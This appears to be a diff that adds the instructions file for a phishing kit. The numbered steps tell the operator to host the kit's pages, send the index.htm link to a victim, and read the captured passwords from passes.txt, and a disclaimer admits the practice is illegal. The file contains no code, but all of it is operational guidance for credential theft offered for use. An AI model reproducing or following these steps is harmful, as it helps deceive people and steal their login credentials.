@@ -1,0 +1,8 @@
+Instructions:-
+1.Upload it to your site(Your site or any other site which support this script, dont ask to us).
+2.Send the link of index.htm to the victim(For example, www.yoursite.com/site/index.htm), never send link of login.php.
+3.Now, wait for some time, as the user will enter his/her details, it will get recorded in the text file(passes.txt).
+4.Open it and see the password.
+
+Disclaimer:- We dont hold any responsibility, we are not responsible if you will misuse this service. Its illegal, so you will be totally responsible for what you do. Do it on your own risk.
+No further support will be provide on this tutorial/topic.(Never ask us to host this file on our server, we wont dont it).
